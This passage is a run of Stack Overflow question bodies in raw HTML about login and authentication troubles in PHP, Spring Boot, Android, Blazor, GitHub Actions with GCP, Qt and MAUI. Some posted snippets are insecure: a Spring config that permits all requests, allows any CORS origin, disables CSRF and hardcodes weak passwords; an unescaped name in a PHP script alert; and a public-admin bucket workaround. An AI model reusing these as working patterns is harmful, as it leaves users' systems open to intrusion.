            $_SESSION['fullname'] = $data_login['uf_name'];
            $_SESSION['created'] = $data_login['ucreated_at'];
            $_SESSION['log'] = 'login';
        // Sukses login
            echo &quot;&lt;script&gt;alert('Hey, Welcome! &quot;. $data_login['uf_name'] . &quot;); location='./index.php'&lt;/script&gt;&quot;;
        } else {
            // Alert ketika password salah
            $_SESSION['error'] = '&lt;div class=&quot;alert alert-danger&quot;&gt;Wrong password!&lt;/div&gt;';
        }
    } else {
        // Alert ketika username salah
        $_SESSION['error'] = '&lt;div class=&quot;alert alert-danger&quot;&gt;Username not found!&lt;/div&gt;';
    }
}


?&gt;

&lt;!DOCTYPE html&gt;
&lt;html lang=&quot;en&quot;&gt;
&lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
    &lt;title&gt;Login | SMS&lt;/title&gt;
    &lt;link rel=&quot;shortcut icon&quot; href=&quot;./assets/compiled/svg/favicon-real.svg&quot; type=&quot;image/x-icon&quot;&gt;
    &lt;link rel=&quot;shortcut icon&quot; href=&quot;data:image/png;base64&quot; type=&quot;image/png&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;./assets/compiled/css/app.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;./assets/compiled/css/app-dark.css&quot;&gt;
    &lt;link rel=&quot;stylesheet&quot; href=&quot;./assets/compiled/css/auth.css&quot;&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;script src=&quot;assets/static/js/initTheme.js&quot;&gt;&lt;/script&gt;
    &lt;div id=&quot;auth&quot;&gt;
        
&lt;div class=&quot;row h-100&quot;&gt;
    &lt;div class=&quot;col-lg-5 col-12&quot;&gt;
        &lt;div id=&quot;auth-left&quot;&gt;
            &lt;div class=&quot;auth-logo&quot;&gt;
                &lt;img src=&quot;./assets/compiled/svg/logo.svg&quot; alt=&quot;Logo&quot;&gt;
            &lt;/div&gt;
            &lt;h1&gt;&lt;b&gt;STOCK MANAGEMENT SYSTEM.&lt;/b&gt;&lt;/h1&gt;
            &lt;p class=&quot;auth-subtitle mb-5&quot;&gt;Login using Username and Password you registered before&lt;/p&gt;

            &lt;form action=&quot;&lt;?php echo $_SERVER[&quot;PHP_SELF&quot;]; ?&gt;&quot; method=&quot;post&quot;&gt;
            &lt;!-- Alert error --&gt;
            &lt;?php 
            
            if (isset($_SESSION['error'])){
                echo $_SESSION['error'];
                unset ($_SESSION['error']);
            }
            
            ?&gt;
                &lt;div class=&quot;form-group position-relative has-icon-left mb-4&quot;&gt;
                    &lt;input type=&quot;text&quot; class=&quot;form-control form-control-xl&quot; placeholder=&quot;Username&quot; name=&quot;username&quot;&gt;
                    &lt;div class=&quot;form-control-icon&quot;&gt;
                        &lt;i class=&quot;bi bi-person&quot;&gt;&lt;/i&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;div class=&quot;form-group position-relative has-icon-left mb-4&quot;&gt;
                    &lt;input type=&quot;password&quot; class=&quot;form-control form-control-xl&quot; placeholder=&quot;Password&quot; name=&quot;password&quot;&gt;
                    &lt;div class=&quot;form-control-icon&quot;&gt;
                        &lt;i class=&quot;bi bi-shield-lock&quot;&gt;&lt;/i&gt;
                    &lt;/div&gt;
                &lt;/div&gt;
                &lt;button type=&quot;submit&quot; name=&quot;login&quot; class=&quot;btn btn-primary btn-block btn-lg shadow-lg mt-5&quot;&gt;Log in&lt;/button&gt;
            &lt;/form&gt;
            
        &lt;/div&gt;
    &lt;/div&gt;

    &lt;div class=&quot;col-lg-7 d-none d-lg-block&quot;&gt;
        &lt;div id=&quot;auth-right&quot;&gt;

        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;

    &lt;/div&gt;
&lt;/body&gt;

&lt;/html&gt;
</code></pre>
<p>i have already find the solution all accross the internet and not once it worked</p>
"
"<p>Help me to find way to learn Spring as a expert.</p>
<p>I am currently trying to implement JWK (JSON Web Key) authentication between services in my project using Spring Boot &amp; Cloud. However, as a junior developer in Spring Boot and with my primary language not being English, I find it extremely challenging to grasp the concepts from the documentation.</p>
<p>When I look at any source code, I often find it outdated, for example, around 9 months old, and much of the code is deprecated. Even the documentation does not seem to cover everything I need.</p>
<p>How can I effectively learn to implement JWKs in Spring Boot? Are there any recommended resources or sources where I can find up-to-date and comprehensive guidance on this topic?</p>
<p>For context, I found it much easier to navigate similar implementations in Node.js as each package had detailed and understandable explanations, unlike Spring Boot.</p>
<p>And I think It's very hard to do anything in Spring cause of :</p>
<ul>
<li>Changes in way of code</li>
<li>Deprecated methods every version</li>
<li>It's Hard Documented</li>
<li>No examples and any previous example have many deprecated code</li>
</ul>
<p>Any help or guidance would be greatly appreciated.
And I want to help to impelement JWK
Thank you</p>
<p>I Try some resources in Blogs and github</p>
<p><a href=""https://github.com/isatishp/sample-security/blob/main/src/main/java/com/example/samplesecurity/SampleSecurityApplication.java"" rel=""nofollow noreferrer"">https://github.com/isatishp/sample-security/blob/main/src/main/java/com/example/samplesecurity/SampleSecurityApplication.java</a></p>
<p><a href=""https://www.baeldung.com/spring-security-oauth2-jws-jwk"" rel=""nofollow noreferrer"">https://www.baeldung.com/spring-security-oauth2-jws-jwk</a></p>
<p>my code :</p>
<pre><code>import com.nimbusds.jose.jwk.JWKSet;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

import java.util.Map;

@RestController
@RequestMapping(&quot;sso-auth-server&quot;)
public class JwkSetRestController {

    private final JWKSet jwkSet = new JWKSet();

    @GetMapping(&quot;/.well-known/jwks.json&quot;)
    public Map&lt;String, Object&gt; keys() {
            return this.jwkSet.toJSONObject();
    }
}

</code></pre>
<p>and my config :</p>
<pre><code>import ecommercemicroservices.authentication.model.CustomUser;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Primary;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpMethod;
import org.springframework.security.authentication.AuthenticationManager;
import org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;
import org.springframework.security.config.annotation.method.configuration.EnableMethodSecurity;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configurers.AbstractHttpConfigurer;
import org.springframework.security.config.http.SessionCreationPolicy;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.oauth2.client.AuthorizedClientServiceOAuth2AuthorizedClientManager;
import org.springframework.security.oauth2.client.InMemoryOAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientProviderBuilder;
import org.springframework.security.oauth2.client.OAuth2AuthorizedClientService;
import org.springframework.security.oauth2.client.registration.ClientRegistrationRepository;
import org.springframework.security.provisioning.InMemoryUserDetailsManager;
import org.springframework.security.web.SecurityFilterChain;
import org.springframework.security.web.context.HttpSessionSecurityContextRepository;
import org.springframework.security.web.context.SecurityContextRepository;
import org.springframework.web.servlet.config.annotation.CorsRegistry;
import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;

@Configuration
@EnableWebSecurity
@EnableMethodSecurity(prePostEnabled = true) // active preAuthorized Annotation for Methods
@Order(1)
public class SecurityConfig {

    @Bean
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurer() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                registry.addMapping(&quot;/**&quot;)
                        .allowedOrigins(&quot;*&quot;)
                        .allowedMethods(&quot;GET&quot;, &quot;POST&quot;, &quot;PUT&quot;, &quot;DELETE&quot;);
            }
        };
    }

    @Bean
    public AuthenticationManager authenticationManager(HttpSecurity http) throws Exception {
        AuthenticationManagerBuilder authenticationManagerBuilder = http.getSharedObject(AuthenticationManagerBuilder.class);
        return authenticationManagerBuilder.build();
    }

    @Bean
    public SecurityContextRepository securityContextRepository() {
        return new HttpSessionSecurityContextRepository();
    }

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
        httpSecurity
//                .csrf(Customizer.withDefaults())
                .csrf(AbstractHttpConfigurer::disable)
                .sessionManagement(customizer -&gt; customizer.sessionCreationPolicy(SessionCreationPolicy.ALWAYS))
                .authorizeHttpRequests(reqs -&gt;
                        reqs.requestMatchers(HttpMethod.POST, &quot;/api/auth/**&quot;).permitAll()
                                .requestMatchers(HttpMethod.GET, &quot;/**&quot;).permitAll()
                                .requestMatchers(HttpMethod.POST, &quot;/**&quot;).permitAll()
                                .requestMatchers(
                                        &quot;/v3/api-docs/**&quot;,
                                        &quot;/swagger-ui/**&quot;,
                                        &quot;/swagger-resources/**&quot;,
                                        &quot;/webjars/**&quot;,
                                        &quot;/swagger.json&quot;
                                ).permitAll()
                                .requestMatchers(HttpMethod.GET, &quot;/csrf/token&quot;).permitAll()
                                .requestMatchers(HttpMethod.OPTIONS, &quot;/**&quot;).permitAll()
                                .anyRequest().authenticated()
                );
        return httpSecurity.build();
    }

    @Bean
    public OAuth2AuthorizedClientService auth2AuthorizedClientService(ClientRegistrationRepository clientRegistrationRepository) {
        return new InMemoryOAuth2AuthorizedClientService(clientRegistrationRepository);
    }

    @Bean
    public AuthorizedClientServiceOAuth2AuthorizedClientManager clientManager(
            ClientRegistrationRepository clientRegistrationRepository,
            OAuth2AuthorizedClientService auth2AuthorizedClientService
    ) {
        var authorizedClientProvider =
                OAuth2AuthorizedClientProviderBuilder
                        .builder()
                        .clientCredentials()
                        .build();

        var clientManager = new AuthorizedClientServiceOAuth2AuthorizedClientManager(
                clientRegistrationRepository,
                auth2AuthorizedClientService
        );

        clientManager.setAuthorizedClientProvider(authorizedClientProvider);

        return clientManager;
    }

    @Bean
    @Primary
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }

    @Bean
    public InMemoryUserDetailsManager userDetailsService(){


        UserDetails ramesh = CustomUser.builder()
                .username(&quot;Muhammed&quot;)
                .password(passwordEncoder().encode(&quot;password&quot;))
                .build();

        UserDetails admin = CustomUser.builder()
                .username(&quot;Admin&quot;)
                .password(passwordEncoder().encode(&quot;admin&quot;))
                .build();

        return new InMemoryUserDetailsManager(ramesh, admin);
    }
}
</code></pre>
<p>and some of YAML file :</p>
<pre><code>spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: http://localhost:8081/auth-server
          jwk-set-uri: http://localhost:8081/auth-server/oauth2/jwks
      client:
        registration:
          provider: authblabla2
          client-id: auth_id_blalala
          client-secret: blablabla
          authorization-grant-type: client_credentials
          scope: api.read,api.write,api.blablabla,blablabla
          client-name: blabla-client
        provider:
          authblabla2:
            issuer-uri: http://localhost:8086/auth-server
</code></pre>
"
"<p>I have been struggling with implementing Google One Tap Sign in. I can get it to store usernames and password but I can't get it to work with a Google token. I use Back4App (Parse) as my database.</p>
<p>I have followed the guide from Google: <a href=""https://developers.google.com/identity/one-tap/android/get-saved-credentials"" rel=""nofollow noreferrer"">https://developers.google.com/identity/one-tap/android/get-saved-credentials</a>  as well as the Back4App one: <a href=""https://www.back4app.com/docs/platform/sign-in-with-google"" rel=""nofollow noreferrer"">https://www.back4app.com/docs/platform/sign-in-with-google</a></p>
<p>I have gotten the id and idToken values and I can see I'm getting the values ( I setup a web OAuth client). The problem I've got is I get a Back4App failure each time saying &quot;Google auth is invalid for this user.&quot;</p>
<p>With the below code block I have tried passing the hashmap values as id_token and id etc, same result.</p>
<pre><code>oneTapClient = Identity.getSignInClient(this);
    signInRequest = BeginSignInRequest.builder()
            .setPasswordRequestOptions(BeginSignInRequest.PasswordRequestOptions.builder()
                    .setSupported(true)
                    .build())
            .setGoogleIdTokenRequestOptions(BeginSignInRequest.GoogleIdTokenRequestOptions.builder()
                    .setSupported(true)
                    //new B4App web client id
                    .setServerClientId(&quot;xxx.apps.googleusercontent.com&quot;)
                    // Only show accounts previously used to sign in.
                    .setFilterByAuthorizedAccounts(false)
                    .build())
            // Automatically sign in when exactly one credential is retrieved.
            .setAutoSelectEnabled(false)
            .build();

    oneTapClient.beginSignIn(signInRequest)
            .addOnSuccessListener(this, new OnSuccessListener&lt;BeginSignInResult&gt;() {
                @Override
                public void onSuccess(BeginSignInResult result) {
                    try {
                        startIntentSenderForResult(
                                result.getPendingIntent().getIntentSender(), REQ_ONE_TAP,
                                null, 0, 0, 0);
                    } catch (IntentSender.SendIntentException e) {
                        Log.e(TAG, &quot;Couldn't start One Tap UI: &quot; + e.getLocalizedMessage());
                    }
                }
            })
            .addOnFailureListener(this, new OnFailureListener() {
                @Override
                public void onFailure(@NonNull Exception e) {
                    // No saved credentials found. Launch the One Tap sign-up flow, or
                    // do nothing and continue presenting the signed-out UI.
                    Log.d(TAG, &quot;One Tap Failure: &quot; + e.getLocalizedMessage());
                    e.printStackTrace();
                }
            }); 

@Override
public void onActivityResult(int requestCode, int resultCode, Intent data) {
    //get result code back from Facebook if they were authenticated correctly, and let Parse know
    super.onActivityResult(requestCode, resultCode, data);
    ParseFacebookUtils.onActivityResult(requestCode, resultCode, data);

    switch (requestCode) {
        case 10:
            try {
                SignInCredential credential = oneTapClient.getSignInCredentialFromIntent(data);
                String idToken = credential.getGoogleIdToken();
                String username = credential.getId();
                String password = credential.getPassword();
                if (idToken != null) {
                    // Got an ID token from Google. Use it to authenticate
                    // with your backend.
                    Log.d(TAG, &quot;Got ID token.&quot;);

                    Map&lt;String, String&gt; authData = new HashMap&lt;String, String&gt;();
                    authData.put(&quot;id&quot;, username);
                    authData.put(&quot;access_token&quot;, idToken);

                    Task&lt;ParseUser&gt; parseUserTask = ParseUser.logInWithInBackground(&quot;google&quot;, authData);
                    parseUserTask.continueWith(new Continuation&lt;ParseUser, Void&gt;() {
                        public Void then(Task task) throws Exception {
                            if (task.isCancelled()) {
                                Log.w(TAG, &quot;Task cancelled&quot;);
                            } else if (task.isFaulted()) {
                                Log.w(TAG, &quot;Save FAIL&quot; + task.getError());
                                //Toast.makeText(context,task.getError().toString(),Toast.LENGTH_LONG).show();
                            } else {
                                // the object was saved successfully.
                                ParseUser user = (ParseUser) task.getResult();
                                Log.w(TAG, &quot;Success &quot; + user.getObjectId() + &quot; &quot; + user.getUsername() + &quot; &quot; + user.getEmail() + &quot; &quot; + user.getSessionToken());

                            }
                            return null;
                        }
                    });
                }
                else if (password != null)
                {
                    // Got a saved username and password. Use them to authenticate
                    // with your backend.
                    Log.d(TAG, &quot;Got password.&quot;);
                    parseLogin(username, password,0);
                }
            } catch (ApiException e) {
                Log.d(TAG, Objects.requireNonNull(e.getLocalizedMessage()));
                //Toast.makeText(context,e.getLocalizedMessage(),Toast.LENGTH_LONG).show();
            }
    }
}
</code></pre>
<p><a href=""https://i.stack.imgur.com/kexsr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/kexsr.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/y7yNI.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/y7yNI.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/pm7g3.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/pm7g3.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/78pBm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/78pBm.png"" alt=""enter image description here"" /></a></p>
"
"<p>I am trying to login using blazor.</p>
<p>Blazor.Bootstrap - version 1.11.1</p>
<p>blazor-dragdrop - version 2.6.1</p>
<p>.NET 8.0.</p>
<p>Major goal is to do login properly, and keep the user logged in after login process.</p>
<p>For the following, I can do NotifyAuthenticationStateChanged only, but it is not enough, since I the user is not kept login (no cookie etc.)</p>
<p>In C# code, after checking for user+password that are OK, I tried calling the login:</p>
<pre><code>public async Task Login(IHttpContextAccessor httpContextAccessor, string username, string password)
{
    List&lt;Claim&gt; claims = new List&lt;Claim&gt; { new Claim(ClaimTypes.Name, username) };

    ClaimsIdentity identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);


    ClaimsPrincipal user = new ClaimsPrincipal(identity);
    await httpContextAccessor.HttpContext.SignInAsync(CookieAuthenticationDefaults.AuthenticationScheme, user);
    NotifyAuthenticationStateChanged(Task.FromResult(new AuthenticationState(user)));

}
</code></pre>
<p>In startup.cs, In ConfigurationService method, I wrote:</p>
<pre><code>...
services.AddHttpContextAccessor();
services.AddScoped&lt;AuthenticationStateProvider, CustomAuthenticationStateProvider&gt;();
...
services.AddAuthentication(CookieAuthenticationDefaults.AuthenticationScheme)
    .AddCookie(options =&gt;
    {
        options.Cookie.Name = &quot;auth_token&quot;;
        options.Cookie.SecurePolicy = Microsoft.AspNetCore.Http.CookieSecurePolicy.Always;
        options.LoginPath = &quot;/login&quot;;
        options.Cookie.MaxAge = TimeSpan.FromMinutes(30);
        options.AccessDeniedPath = &quot;/access-denied&quot;;
    });

services.AddAuthorization();
services.AddCascadingAuthenticationState();
</code></pre>
<p>and in startup.cs, Configure method:</p>
<pre><code>app.UseAuthentication();
app.UseAuthorization();
</code></pre>
<p>For the line, starts with (it is essential creating the token, cookie, etc):
await httpContextAccessor.HttpContext.SignInAsync</p>
<p>I encountered an error:</p>
<blockquote>
<p>Error: System.InvalidOperationException: OnStarting cannot be set
because the response has already started.    at
Microsoft.AspNetCore.Server.Kestrel.Core.Internal.Http.HttpProtocol.ThrowResponseAlreadyStartedException(String
value)    at
Microsoft.AspNetCore.Server.Kestrel.Core.Internal.Http.HttpProtocol.OnStarting(Func<code>2 callback, Object state)    at Microsoft.AspNetCore.Authentication.Cookies.CookieAuthenticationHandler.InitializeHandlerAsync() at Microsoft.AspNetCore.Authentication.AuthenticationHandler</code>1.InitializeAsync(AuthenticationScheme
scheme, HttpContext context)    at
Microsoft.AspNetCore.Authentication.AuthenticationHandlerProvider.GetHandlerAsync(HttpContext
context, String authenticationScheme)    at
Microsoft.AspNetCore.Authentication.AuthenticationService.SignInAsync(HttpContext
context, String scheme, ClaimsPrincipal principal,
AuthenticationProperties properties)    ...</p>
</blockquote>
<p>What may be wrong?</p>
<p>Whether I change the way I do login:</p>
<pre><code>public class CustomAuthenticationStateProvider : AuthenticationStateProvider
...
public async Task Login(string username, string password)
{
    // Authentication logic here (e.g., validate username and password)
    // For simplicity, let's assume the user is authenticated successfully

    List&lt;Claim&gt; claims = new List&lt;Claim&gt; { new Claim(ClaimTypes.Name, username) };
    ClaimsIdentity identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
    ClaimsPrincipal userPrincipal = new ClaimsPrincipal(identity);

    // This line updates the authentication state across the Blazor app
    NotifyAuthenticationStateChanged(Task.FromResult(new AuthenticationState(userPrincipal)));
}
</code></pre>
<p>and calling Login, I do:</p>
<pre><code>[Inject]
private AuthenticationStateProvider CustomStateProvider { get; set; }
...
AuthenticationState authState = await CustomStateProvider.GetAuthenticationStateAsync();
</code></pre>
<p>and I see that authState.Identity.Claims.Count = 0;</p>
<p>authState.Identity.Claims.Count should have at least 1 value.</p>
<p>Is there something special I should write in startup.cs in order that the above work properly? Probably need bearer token + cookie.</p>
"
"<p>I am trying to set up a new project using Spring security. The purpose of the projetc is to create few web apis to be used in a react interface. At present, I am using Spring boot 3.2.2 and Spring security 6.2.1</p>
<p>I have most of the things set up. However, for some reasons, the framework always throws 403 on my permitAll() endpoints.</p>
<p>Below is my security chain object:</p>
<pre><code> @Bean
public SecurityFilterChain securityFilterChain(HttpSecurity httpSecurity) throws Exception {
    System.out.println(httpSecurity);
      return httpSecurity
                .authorizeHttpRequests((auth) -&gt; auth
                        .requestMatchers(&quot;/api/myproject/admin/**&quot;) // I have tried removing this condition also
                        .hasRole(&quot;ADMIN&quot;)
                        .requestMatchers(HttpMethod.POST, &quot;/public/login&quot;) // I have tried without context path also
                        .permitAll()
                        .requestMatchers(HttpMethod.POST, &quot;/api/myproject/public/login&quot;) // tried with context path also
                        .permitAll()
                        .anyRequest().authenticated()
                    )
                .csrf(AbstractHttpConfigurer::disable) // tried disabling csrf as well
                .authenticationProvider(authenticationProvider())
                .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)
                .build();

}
</code></pre>
<p>I have gone through many similar questions and articles and have tried lot of thing including:</p>
<ol>
<li>Using both GET and POST for my login endpoint (Ideally I wanted a POST).</li>
<li>Tried disabling csrf</li>
<li>Tried putting the endpoint path with and without context path (/api/myproject is my context path)</li>
<li>Tried specifying HTTP POST verb as shown above</li>
<li>Also tried the above config with everything removed and just 1 rule for login route</li>
</ol>
<p>None of these have worked for me so far. However If a permitAll everything like:</p>
<pre><code>return httpSecurity
            .authorizeHttpRequests((auth) -&gt; auth
            .anyRequest().permitAll()
</code></pre>
<p>then it works for me and makes all the endpoints public including the login endpoint.</p>
<p>I am not sure what I am doing wrong for whitelisting only the login endpoint as public. Can some one please help.</p>
<p>Edit: Adding the controller code below:</p>
<pre><code>@Slf4j
@RestController
@RequestMapping(&quot;/public&quot;)
public class LoginController {

    @Autowired
    private LoginService loginService;

    @PostMapping(&quot;/login&quot;)
    public ResponseEntity&lt;LoginResponse&gt; generateUserToken(@RequestBody LoginRequest loginRequest) {
        log.info(&quot;generateUserToken Started&quot;);
        String token = loginService.login(loginRequest.getEmailId(), loginRequest.getPwd());
        return ResponseEntity.ok(new LoginResponse(token));
    }

}
</code></pre>
<p>The postman cUrl for the API call is:</p>
<pre><code>curl --location 'http://localhost:8080/api/myproject/public/login' \
--header 'Content-Type: application/json' \
--header 'Cookie: JSESSIONID=9E2DD3E4A04619324786B0F595BD96FD' \
--data-raw '{
    &quot;emailId&quot;: &quot;dkjkaj@gmail.com&quot;,
    &quot;pwd&quot;: &quot;jhdsjhdj&quot;
}'
</code></pre>
<p>Thanks</p>
"
"<p>I have Node.js installed by NVM on server and it doesn't work with SSH.
It shows <code>node: command not found</code> in non-login shell.</p>
<p>For example, this won't work</p>
<pre><code>ssh server1 &lt;&lt;doc
    node -v
doc
</code></pre>
<p>This doesn't work too</p>
<pre><code>ssh server1 &lt;&lt;&lt;&quot;bash -l; node -v&quot;
</code></pre>
<p>The NVM init is inside .bashrc so I tried to source it but still not ok</p>
<pre><code>ssh server1 &lt;&lt;doc
    source /etc/profile
    source ~/.bashrc
    node -v
doc
</code></pre>
<p>The only way to make it work is forcing ssh using TTY</p>
<pre><code>ssh -tt server1 &lt;&lt;doc
    node -v
doc
</code></pre>
<p>However, the script is long and I don't wish to see the <strong>shell printing out every command</strong>. Even after add 'set +x' to top of script it still prints out every command.</p>
<p>And <code>-tt</code> will force TTY and the <strong>ssh command doesn't stop</strong>. Add 'exit' to the end of script is ok but still the issue of printing out command above.</p>
<p>How to do <code>ssh</code> without <code>-tt</code> and just as in login shell?</p>
"
"<p>Disclaimer: I DID EVERYTHING BY GOING THROUGH THIS &quot;https://github.com/google-github-actions/auth&quot;</p>
<p>I am trying to write a simple workflow that authenticates to GCP using Service Account Key JSON and then copies a bunch of files to GCP bucket. (I have given permissions like 'Storage Admin' &amp; 'Storage Object Admin' to this service principal on my specific GCP bucket).</p>
<p>Still it gives this error on github action run like, &quot;Anonymous caller does not have storage.objects.list access to the Google Cloud Storage bucket. Permission 'storage.objects.list' denied on resource (or it may not exist).&quot;</p>
<p>I believe, It is not able to Authenticate to GCP properly. But I want to authenticate using Service Account Jey Json ONLY.</p>
<p>Here is my workflow file</p>
<pre><code>name: Static Site Deploy

on:
  push:
    branches: [feature-deploy]

env:
  GCP_BUCKET_NAME: hello-test-bucket
  SOURCE: ./dist
        

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Setup node  
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Npm Install
        run: npm ci --force
        
      - name: Build project
        run: npm run build-dev
      
      - name: Configure GCP credentials
        uses: google-github-actions/auth@v2
        with:
          credentials_json: ${{ secrets.GCP_SERVICE_ACCOUNT_CREDENTIALS }}

      - name: Upload to GCP bucket
        run: |
              CACHE_CONTROL=&quot;public, max-age=2592000&quot;
              LOCAL_ROOT_DIRECTORY=&quot;${{ env.SOURCE }}&quot;
              GCP_BUCKET=&quot;gs://${{ env.GCP_BUCKET_NAME }}&quot;
    
              # Function to determine content type based on file extension
              get_content_type() {
                  local file_extension=${1##*.}
                  case &quot;$file_extension&quot; in
                      &quot;html&quot;) echo &quot;text/html:no-cache&quot; ;;
                      &quot;json&quot;) echo &quot;application/json:no-cache&quot; ;;
                      &quot;js&quot;) echo &quot;application/javascript:public,max-age=2592000&quot; ;;
                      &quot;ico&quot;) echo &quot;image/x-icon:public,max-age=2592000&quot; ;;
                      &quot;png&quot;) echo &quot;image/png:public,max-age=2592000&quot; ;;
                      &quot;css&quot;) echo &quot;text/css:public,max-age=2592000&quot; ;;
                      &quot;svg&quot;) echo &quot;image/svg+xml:public,max-age=2592000&quot; ;;
                      &quot;woff&quot;) echo &quot;application/font-woff:public,max-age=2592000&quot; ;;
                      &quot;woff2&quot;) echo &quot;application/font-woff2:public,max-age=2592000&quot; ;;
                      &quot;eot&quot;) echo &quot;application/vnd.ms-fontobject:public,max-age=2592000&quot; ;;
                      &quot;ttf&quot;) echo &quot;application/x-font-ttf:public,max-age=2592000&quot; ;;
                      &quot;otf&quot;) echo &quot;application/x-font-opentype:public,max-age=2592000&quot; ;;
                      &quot;jpg&quot; | &quot;jpeg&quot;) echo &quot;image/jpeg:public,max-age=2592000&quot; ;;
                      &quot;gif&quot;) echo &quot;image/gif:public,max-age=2592000&quot; ;;
                      &quot;mp4&quot;) echo &quot;video/mp4:public,max-age=2592000&quot; ;;
                      *) echo &quot;application/octet-stream:public,max-age=2592000&quot; ;;  # Default for unknown types
                  esac
              }
    
              # Function to copy a file with metadata
              copy_file() {
                  local file_path=$1
                  local gcp_path=$2
                  local content_type=$(get_content_type &quot;$file_path&quot;)
                  IFS=':' read -r content_type custom_cache_control &lt;&lt;&lt; &quot;$content_type&quot;
                  gsutil -D -h &quot;Cache-Control:$custom_cache_control&quot; -h &quot;Content-Type:$content_type&quot; cp &quot;$file_path&quot; &quot;$gcp_path&quot;
              }
    
              # Recursively copy files from the local directory to the GCP bucket
              find &quot;$LOCAL_ROOT_DIRECTORY&quot; -type f | while read file; do
                  # Create a GCP path that preserves the local directory structure
                  gcp_path=&quot;$GCP_BUCKET/${file#$LOCAL_ROOT_DIRECTORY/}&quot;
    
                  # Copy the file
                  copy_file &quot;$file&quot; &quot;$gcp_path&quot;
              done
</code></pre>
<p>Here is the error
<a href=""https://i.stack.imgur.com/Htbop.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/Htbop.png"" alt=""error on github actions"" /></a></p>
<p>This is how my service principal looks json looks like (I have added it in github secrets)</p>
<pre><code>{
    &quot;auth_provider_x509_cert_url&quot;: &quot;&quot;,
    &quot;auth_uri&quot;: &quot;&quot;,
    &quot;client_email&quot;: &quot;&quot;,
    &quot;client_id&quot;: &quot;&quot;,
    &quot;client_x509_cert_url&quot;: &quot;&quot;,
    &quot;private_key&quot;: &quot;-----BEGIN PRIVATE KEY----------END PRIVATE KEY-----\n&quot;,
    &quot;private_key_id&quot;: &quot;&quot;,
    &quot;project_id&quot;: &quot;&quot;,
    &quot;token_uri&quot;: &quot;&quot;,
    &quot;type&quot;: &quot;service_account&quot;,
    &quot;universe_domain&quot;: &quot;googleapis.com&quot;
}
</code></pre>
<p>IMPORTANT: WHEN I GIVE ACCESS TO &quot;allUsers&quot; and attach same permissions like 'Storage Admin' and 'Storage Object Admin' then THIS ISSUE IS GONE, THE WORKFLOW RUNS SUCCESSFULLY. BUT THAT IS A SECURITY ISSUE, I ONLY WANT THIS SPECIFIC SERVICE PRINCIPAL TO PERFORM OPERATIONS ON MY GCP BUCKET.</p>
<p>WHEN I GIVE ACCESS TO &quot;allUsers&quot; and attach same permissions like 'Storage Admin' and 'Storage Object Admin' then THIS ISSUE IS GONE, THE WORKFLOW RUNS SUCCESSFULLY. BUT THAT IS A SECURITY ISSUE.
I DID EVERYTHING BY GOING THROUGH THIS &quot;https://github.com/google-github-actions/auth&quot;</p>
<p>I ONLY WANT THIS SPECIFIC SERVICE PRINCIPAL TO PERFORM OPERATIONS ON MY GCP BUCKET.</p>
"
"<p>So I've done this in C# all the time, and did it with Visual C++ and ADSI back in the day, but I've got a QT C++ project (for a Windows-only target) that needs to get the username and domain of the currently authenticated user and then ask the domain controller whether that user belongs to a handful of specific groups. I had hoped that QT's QAuthenticator class could do this, but it looks like that only does outbound NTLM and can't actually discover anything about existing users -- which brings me back to C++ libraries. Is there a better solution for this than ADSI nowadays? And if not, where do I go to get the ADSI header files now that Technet isn't a thing anymore?</p>
"
"<p>I am trying to implement Authentication in MAUI Android App (.NET8)</p>
<p>I am following the steps mentioned here:
<a href=""https://learn.microsoft.com/en-us/dotnet/maui/platform-integration/communication/authentication?view=net-maui-8.0&amp;tabs=android"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/dotnet/maui/platform-integration/communication/authentication?view=net-maui-8.0&amp;tabs=android</a></p>
<p>But getting erorr as <em>'Content' does not exists</em></p>
<p><a href=""https://i.stack.imgur.com/aq9ga.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/aq9ga.png"" alt=""enter image description here"" /></a></p>
"
"<p>My and my classmate currently working in a project, where I creating the backend in Node.js with express, and he is creating the frontend in Angular.</p>
